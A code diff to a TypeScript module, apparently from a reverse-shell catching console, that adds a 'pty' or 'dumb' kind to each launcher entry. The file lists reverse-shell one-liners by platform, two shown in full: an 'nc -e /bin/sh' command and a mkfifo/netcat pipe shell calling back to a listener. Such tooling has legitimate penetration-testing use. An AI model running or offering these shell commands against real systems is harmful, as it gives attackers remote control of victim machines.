@@ -8,9 +8,12 @@
 export interface CatchLauncher {
   id: string
   os: string
-  // What the shape gives on the wire: whether the caught shell runs under a
-  // pty (echoes typing, ^C interrupts, colors, full-screen programs) or is a
-  // dumb pipe (works, but typing is invisible and ^C is just a byte).
+  // Whether the caught shell runs under a pty: 'pty' shapes are the
+  // full-interactive catch (echo, ^C, colors, full-screen programs), 'dumb'
+  // shapes work but the shell has no terminal -- typing needs the console's
+  // Local echo, and ^C is just a byte.
+  kind: 'pty' | 'dumb'
+  // The longer human sentence the chip's title carries.
   note: string
   command: string
 }
@@ -33,7 +36,7 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     // just a byte. The console's Local echo switch makes the plain shapes'
     // typing visible; nothing but a pty makes ^C interrupt.
     {
-      id: 'unix-python-pty',
+      id: 'unix-python-pty', kind: 'pty',
       os: 'linux',
       note: 'full interactive — real pty',
       command:
@@ -41,7 +44,7 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     },
 
     {
-      id: 'unix-socat',
+      id: 'unix-socat', kind: 'pty',
       os: 'linux',
       note: 'full interactive — real pty',
       // The same pty posture over socat, for targets that have it: the exec
@@ -56,7 +59,7 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     },
 
     {
-      id: 'unix-bash',
+      id: 'unix-bash', kind: 'dumb',
       os: 'linux',
       note: 'dumb — no echo, no ^C; flip Local echo in the console',
       // No pty here -- the plain bash-over-socket shape. The TERM default
@@ -71,20 +74,20 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     // refuses it, so the fifo shape (a /bin/sh over the pipe) rides beside
     // it. Showing both costs nothing while a missing one costs a round trip.
     {
-      id: 'unix-nc',
+      id: 'unix-nc', kind: 'dumb',
       os: 'linux',
       note: 'dumb — no echo, no ^C; flip Local echo in the console',
       command: `nc -e /bin/sh ${host} ${port}`,
     },
     {
-      id: 'unix-nc-fifo',
+      id: 'unix-nc-fifo', kind: 'dumb',
       os: 'linux',
       note: 'dumb — for OpenBSD netcat; flip Local echo in the console',
       command: `rm -f ${fifo}; mkfifo ${fifo}; cat ${fifo} | /bin/sh -i 2>&1 | nc ${host} ${port} > ${fifo}`,
     },
 
     {
-      id: 'unix-python',
+      id: 'unix-python', kind: 'dumb',
       os: 'linux',
       note: 'dumb — no echo, no ^C; flip Local echo in the console',
       command:
@@ -92,7 +95,7 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     },
 
     {
-      id: 'unix-perl',
+      id: 'unix-perl', kind: 'dumb',
       os: 'linux',
       note: 'dumb — no echo, no ^C; flip Local echo in the console',
       command:
@@ -100,7 +103,7 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     },
 
     {
-      id: 'unix-php',
+      id: 'unix-php', kind: 'dumb',
       os: 'linux',
       note: 'dumb — no echo, no ^C; flip Local echo in the console',
       command:
@@ -108,7 +111,7 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     },
 
     {
-      id: 'windows-powershell',
+      id: 'windows-powershell', kind: 'dumb',
       os: 'windows',
       note: 'dumb — prints its own prompt; no ^C',
       command:
